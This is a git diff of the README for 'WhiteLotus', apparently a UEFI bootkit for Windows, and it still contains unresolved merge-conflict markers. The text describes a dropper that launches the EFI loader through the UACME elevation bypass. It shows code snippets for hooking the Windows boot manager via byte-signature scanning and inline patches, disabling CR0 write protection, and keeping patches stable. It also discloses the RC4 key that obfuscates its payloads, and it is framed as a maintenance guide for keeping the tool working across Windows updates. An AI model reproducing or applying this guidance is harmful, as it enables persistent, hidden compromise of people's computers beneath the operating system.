@@ -123,6 +123,7 @@ Handles UEFI-specific operations on a running Windows system:
 
 ---
 
+<<<<<<< Updated upstream
 ### Modification 
 
 The project currently does not require any modifications, but if changes are necessary for certain situations, follow these steps. 
@@ -171,6 +172,161 @@ You can also use this same tool for the WhiteLotus.efi file (this is not require
 The project that needs to be run is the Dropper project. Do not manually launch the LoadEfi project in any way. The Dropper will handle this.
 
 Additionally, the Dropper executable file does not require UAC permission. It can be launched with standard privileges. This way, the Dropper will run LoadEfi via UACME.
+=======
+## Execution
+
+WhiteLotus operates entirely through **byte-level pattern matching and patching**. No source code modifications to Windows binaries are required.
+
+### How Byte-Based Execution Works
+
+#### 1. Pattern Scanning (Signature-Based Function Location)
+
+Instead of relying on exported functions or fixed addresses, the project uses **byte signatures** to locate functions:
+
+```c
+// Example: Finding ImgArchStartBootApplication in bootmgfw.efi
+FindPattern(
+    SigImgArchStartBootApplication,  // Byte signature pattern
+    0xCC,                              // Wildcard byte (ignore)
+    sizeof(SigImgArchStartBootApplication),
+    ImageBase + SectionRVA,
+    SectionSize,
+    &Found
+);
+```
+
+This approach:
+- Works across different Windows build numbers
+- Automatically adapts to version differences
+- Finds the correct function regardless of ASLR slide (after base is resolved)
+
+#### 2. Function Prologue Detection
+
+After finding a signature within a function, `FindFunctionStart()` scans backward to locate the actual function prologue (entry point).
+
+#### 3. Inline Hooking via Byte Patching
+
+The project installs hooks by:
+
+1. **Backing up original bytes**: Saves original function prologue
+2. **Writing hook template**: Overwrites with a jump/call stub
+3. **Patching address**: Writes the hook target address into the template
+4. **Restoring original**: Some hooks restore bytes before calling originals
+
+```c
+// Hook template structure (architectural)
+// Preserves register state, calls handler, optionally restores
+
+CopyWpMem(OriginalFunction, gHookTemplate, sizeof(gHookTemplate));
+CopyWpMem(OriginalFunction + AddressOffset, &HookHandler, sizeof(HookHandler));
+```
+
+#### 4. Memory Protection Bypass
+
+Before patching, the project handles memory protection:
+
+```c
+// Disable CR0.WP (Write Protect) temporarily
+Cr0 = AsmReadCr0();
+AsmWriteCr0(Cr0 & ~CR0_WP);
+
+// Perform patch
+CopyWpMem(Target, Patch, Size);
+
+// Restore CR0
+AsmWriteCr0(Cr0);
+```
+
+#### 5. TPL Elevation
+
+To prevent interruption during patching:
+
+```c
+EFI_TPL OldTpl = gBS->RaiseTPL(TPL_HIGH_LEVEL);
+// Patch operations
+gBS->RestoreTPL(OldTpl);
+```
+
+---
+
+## Modification Guide
+
+> **Important:** This project does not require recompilation. All modifications can be made at the byte level directly in the source files.
+
+### Why No Recompilation is Needed
+
+The project uses embedded byte arrays for:
+- **Hook templates**: Assembly stubs that are written to memory
+- **Signature patterns**: Byte sequences used for function location
+- **Patch data**: Specific byte modifications applied to target functions
+
+### Common Modifications
+
+#### 1. Updating Signature Patterns
+
+When Windows updates and old signatures no longer match, update the byte patterns in `Intern.c`:
+
+```c
+// Find the signature array in Intern.c
+STATIC CONST UINT8 SigImgArchStartBootApplication[] = {
+    0x48, 0x89, 0x5C, 0x24, 0x10,  // Function prologue
+    // ... additional bytes
+    0xCC, 0xCC, 0xCC               // Wildcards (ignored during search)
+};
+```
+
+#### 2. Adjusting Hook Templates
+
+The hook template in `Arch.h` may need adjustment for different Windows versions or architectures:
+
+```c
+// gHookTemplate contains the assembly bytes written to target function
+// Modify this if function prologue length changes
+```
+
+#### 3. Updating Version Checks
+
+Version-specific logic in `PatchBootMgfw.c`:
+
+```c
+// Windows 10 1809+ changed function names
+CONST CHAR16* FunctionName = BuildNumber >= 17134
+    ? L"ImgArchStartBootApplication"
+    : L"ImgArchEfiStartBootApplication";
+```
+
+#### 4. Adding New Patch Targets
+
+To patch additional functions:
+
+1. Define new signature pattern in `Intern.c`
+2. Add global variables for original function pointer and backup
+3. Create hook handler function
+4. Call patch installation in appropriate location
+
+### Build Requirements
+
+If you do need to recompile (e.g., changing logic, not just bytes):
+
+- **WhiteLotusDXE**: EDK II development environment
+- **WhiteLotusEXE**: Visual Studio with Windows SDK (x64)
+
+### Testing Changes
+
+1. Make byte-level changes to source files
+2. Rebuild if logic changed (otherwise files can be used as-is)
+3. Test in a controlled environment with virtualization (recommended)
+4. Verify patches are applied correctly using a debugger or logging output
+
+---
+
+## Technical Notes
+
+- **TPL Management**: All patching operations occur at `TPL_HIGH_LEVEL` to prevent race conditions
+- **CRC32 Recalculation**: After modifying runtime service tables, CRC32 is recalculated to prevent BSOD
+- **Virtual Address Mapping**: Events are registered for `EVT_SIGNAL_EXIT_BOOT_SERVICES` and `EVT_SIGNAL_VIRTUAL_ADDRESS_CHANGE` to properly handle pointer conversion
+- **RC4 Encryption**: EXE payloads use RC4 with key `S3cr3t_K3y_2026!` for basic obfuscation
+>>>>>>> Stashed changes
 
 ---
 
